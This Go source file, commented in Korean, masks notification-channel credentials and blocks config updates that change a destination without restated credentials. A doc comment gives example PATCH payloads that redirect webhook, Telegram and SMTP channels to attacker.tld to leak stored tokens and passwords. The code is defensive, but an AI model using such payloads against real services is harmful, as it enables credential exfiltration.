package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix는 마스킹 값의 표시 접두사이다. API가 자격 증명을 되돌려줄 때 실제 내용 대신 이 접두사가 붙은 값으로 바꾸며,
// 업데이트 API가 이 접두사가 붙은 값을 받으면 「DB의 원래 값을 그대로 유지」하는 것으로 이해한다.
//
// 빈 문자열이나 고정 상수 대신 접두사를 쓰는 이유는, 그에 더해 약간의 식별 정보를 실을 수 있기 때문이다
// (MaskedValue 참고). 이렇게 하면 사용자가 키를 다시 붙여 넣지 않아도 「어느 봇인지」를 구분할 수 있다.
const MaskedPrefix = "__masked__"

// MaskedValue는 마스킹 값을 생성한다.
//
//	"__masked__"              원래 값이 너무 짧으므로 어떤 힌트도 주지 않는다
//	"__masked__:…ab12cd"      원래 값의 끝 6자리를 식별 힌트로 붙인다
//
// 끝 6자리만 노출하는 것은 의도된 선택이다. Webhook 주소의 식별 정보는 끝 부분에 있고(예: 기업 위챗의 key,
// 페이슈의 봇 id), 앞부분은 봇마다 같아서 식별 가치가 없다. 끝 6자리만으로는 자격 증명을 복원할 수 없지만,
// 설정자가 「내가 쓰던 그 그룹이구나」라고 알아볼 수는 있다.
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked는 값이 마스킹 값인지(즉, 응답된 뒤 수정되지 않았는지) 보고한다.
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig는 설정의 사본을 반환하며, 해당 채널의 자격 증명 필드를 마스킹 값으로 바꾼다.
//
// 알 수 없는 채널 종류에 대해서는 원래 설정 대신 빈 맵을 반환한다. 채널 종류를 알아볼 수 없을 때 자격 증명이 들어 있을 수 있는
// 원본 내용을 통째로 되돌려주느니, UI가 「설정을 사용할 수 없음」을 표시하는 편이 낫다.
// 자격 증명이 아닌 필드는 그대로 두어야 UI가 정상적으로 표시할 수 있다.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// headers 같은 중첩 구조는 통째로 하나의 자격 증명으로 취급한다. 하위 키마다 판단하려면
		// 각 채널이 「어느 하위 키가 자격 증명인지」에 대한 규칙을 따로 선언해야 하는데,
		// 복잡도가 이득을 훨씬 넘어선다.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials는 「대상 주소는 바뀌었지만 호출자가 자격 증명 필드에 대해 입장을 밝히지 않은」 상황을 나타낸다.
// 자격 증명을 조용히 통과시키거나 조용히 버리지 않고 이 오류를 반환하는 이유는 PrepareConfigUpdate를 참고하라.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // 변경된 대상 키
	Missing []string // 입장을 명시하지 않은 자격 증명 키
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "대상 주소(" + strings.Join(e.Changed, ", ") + ")가 변경되었습니다. 자격 증명 필드(" +
		strings.Join(e.Missing, ", ") + ")를 함께 다시 입력하세요: 새 값을 넣거나, 비워 두어 더는 자격 증명이 필요 없음을 표시하세요. " +
		"기존 자격 증명은 이전 주소에만 유효하므로, 그대로 사용하면 새 주소에 넘겨주는 셈입니다."
}

// PrepareConfigUpdate는 채널 설정을 병합하고, 「대상 주소 변경」이라는 보안상 민감한 상황을 처리한다.
//
// 채널 업데이트 경로에서 맨 MergeConfig를 대신해 쓰며, 실제로 검증된 다음 경로를 막기 위해 만들어졌다.
// 대상 주소(메시지가 어디로 가는지)와 자격 증명(어떤 신원으로 보내는지)은 서로 독립된 필드인데,
// MergeConfig는 「언급되지 않은 키」를 모두 DB의 원래 값으로 유지한다. 그래서 채널을 PATCH할 수 있는 사람이
// **주소만 바꾸고 자격 증명에 대해서는 아무 말도 하지 않으면**, 서버가 DB의 실제 자격 증명을 공격자가 통제하는
// 엔드포인트로 보내게 된다.
//
//	webhook  {config:{url:"https://attacker.tld"}}  → 원래 Authorization 헤더가 요청과 함께 외부로 나간다
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<실제 Token>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    → STARTTLS 후 사용자 이름과 비밀번호가 넘어간다
//
// 이 경로는 완전히 조용하게 일어나고 리다이렉트에 의존하지도 않으므로(따라서 교차 호스트 리다이렉트를 거부하는 방식으로는 막을 수 없다),
// 본 패키지 마스킹 메커니즘의 목표인 「자격 증명은 브라우저에 되돌려주지 않는다」를 직접 무너뜨린다.
//
// 규칙: 어떤 대상 키든 새 값으로 바뀌면, 호출자는 **모든** 자격 증명 키에 대해 명시적으로 입장을 밝혀야 한다.
//   - 새 값을 준다 → 새 값을 사용한다
//   - 빈 문자열을 명시적으로 준다 → 이 필드는 더 이상 자격 증명이 필요 없다(비우기 의미를 유지한다)
//   - 마스킹 값을 그대로 돌려주거나 이 키를 아예 언급하지 않는다 → 거부한다
//
// 세 번째 경우도 거부하는 이유는, 「마스킹 값」의 의미가 「이전 자격 증명을 그대로 쓴다」이기 때문이다. 그런데 이전 자격 증명은
// 이전 주소에서만 유효하다. 여기서 일부러 「자격 증명을 자동으로 버리는」 방식을 쓰지 않는 이유는, 선택적인 자격 증명 필드
// (webhook의 headers, email의 password)에서는 그렇게 하면 인증이 사라졌는데도 API가 200을 반환하는 상황이 조용히 생기기 때문이다.
// 이는 오류를 내는 것보다 원인을 찾기 훨씬 어렵다. 조작자가 한 번 더 입력하는 편이 낫다.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("등록되지 않은 채널 유형입니다: %q", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// 문자열이 아닌 자격 증명 값(예: webhook의 headers는 객체) 안에 마스킹 리터럴이 들어 있다면,
	// 호출자가 「원래 값 유지」라는 보초 값을 구조체 내부에 끼워 넣은 것이다. MergeConfig는 「문자열이면서
	// 접두사가 붙은 것」만 마스킹으로 인식하므로, 이런 형태는 일반 객체로 취급되어 그대로 저장된다.
	// 그러면 DB에 리터럴 "__masked__"가 실제로 기록되어, 이후 인증이 아무 오류 없이 조용히 실패한다. 그래서 거부한다.
	//
	// 이 검사는 반드시 **맨 앞**에 있어야 한다. 주소가 바뀌지 않았을 때는 조기 반환하므로, 뒤에 두면
	// 「주소 변경」 경로만 검사하게 된다(첫 버전이 바로 이렇게 잘못 배치되어 있었고, 테스트가 이를 바로 잡아냈다).
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// 실제로 바뀐 대상 키를 찾는다. 마스킹 값은 「바뀌지 않음」과 같다.
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// 주소가 바뀌지 않았으므로 일반 병합을 한다(마스킹 값은 원래 값 유지, 빈 문자열은 비우기, 나머지는 덮어쓰기).
		return MergeConfig(stored, incoming), nil
	}

	// 주소가 바뀌었다: 모든 자격 증명 키에 대해 명시적인 입장을 요구한다.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers는 마스킹 보초 값을 문자열이 아닌 구조 안에 끼워 넣어 제출하는 것을 거부한다.
//
// 마스킹 메커니즘의 전제는 「값 전체가 하나의 문자열」이라는 것이다. webhook의 headers처럼 객체인 필드는
// 통째로 마스킹(문자열 "__masked__"로 기록)하거나 통째로 제출하는 수밖에 없다. 객체 내부에 보초 값을 끼워 넣으면
// 「변경하지 않음」을 나타낼 수도 없고, 실제 값으로 저장되어 버린다.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("%s 필드의 내용에 마스킹 표시(%q)가 들어 있습니다. 이 필드는 전체를 비워 두어 기존 값을 유지하거나 전체를 새 값으로 제출해야 하며, 구조체 내부에 마스킹 표시를 끼워 넣을 수 없습니다",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue는 두 설정 값이 동등한지 비교한다. JSON 직렬화로 비교하는 이유는 타입 차이를 함께 처리하기 위해서다.
// 프론트엔드가 제출한 포트는 number이지만, DB에서 읽어 온 값은 float64이므로 직접 ==로 비교하면 잘못 판단한다.
//
// 「빈 값」은 먼저 정규화한 뒤 비교해야 한다. 이 설정 모델에서 빈 문자열과 「키가 없는 상태」는 같은 상태이기 때문이다.
// MergeConfig는 빈 문자열을 명시적 비우기로 보고 해당 키를 delete한다. 정규화하지 않으면, 항상 비워 두는 선택적 대상 필드가
// 이 경로로 빠진다. (Telegram의 base_url이 유일하게 이런 필드이다. 비워 두면 공식 주소를 쓴다.)
//
//	생성 시 base_url:"" 저장  →  첫 저장에서 MergeConfig가 키를 삭제
//	→ 두 번째 저장 때 incoming은 "", stored에는 키가 없으므로 「주소가 바뀌었다」고 판단
//	→ 자격 증명이 마스킹 값 → 400 「대상 주소가 변경되었습니다. 자격 증명 필드를 함께 다시 입력하세요」
//
// 그러면 사용자가 아무것도 바꾸지 않았는데도, Bot Token을 다시 붙여 넣지 않는 한 매번 저장이 실패한다.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue는 설정 값이 「빈」 값인지 판정한다.
// 판정 기준은 MergeConfig의 비우기 판정(strings.TrimSpace(s) == "")과 반드시 일치해야 한다.
// 그렇지 않으면 「MergeConfig는 삭제해야 한다고 보는데, sameConfigValue는 값이 있다고 보는」 틈이 생긴다.
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig는 incoming을 stored 위에 병합한다. 채널 설정을 업데이트할 때 쓰인다.
//
// 규칙:
//   - incoming에서 값이 마스킹인 키 → stored의 원래 값을 유지한다(사용자가 이 필드를 수정하지 않았다)
//   - incoming에서 값이 빈 문자열인 키 → 명시적 비우기로 보고 해당 키를 삭제한다
//   - 나머지 키 → incoming 값으로 덮어쓴다
//   - stored에는 있지만 incoming에는 없는 키 → 유지한다(부분 업데이트 의미)
//
// 빈 문자열을 「비우기」로 볼지는 명확히 해야 한다. 프론트엔드 폼은 입력하지 않은 필드를 빈 문자열로 제출하는데,
// 이를 유효한 값으로 기록하면 「비워 두어 원래 값을 유지한다」는 필드가 실제로 지워져 버린다.
// 여기서 명시적 비우기를 택한 이유는, 잘못 설정한 필드를 지우려 할 때 사용자에게 다른 표현 수단이 없기 때문이다.
// (필드를 빼 버리면 「제공하지 않음」과 「빈 값 제공」을 구별할 수 있지만, UI는 그 차이를 쓰지 않는다.)
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // 마스킹 값 = 수정하지 않음, stored 유지
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
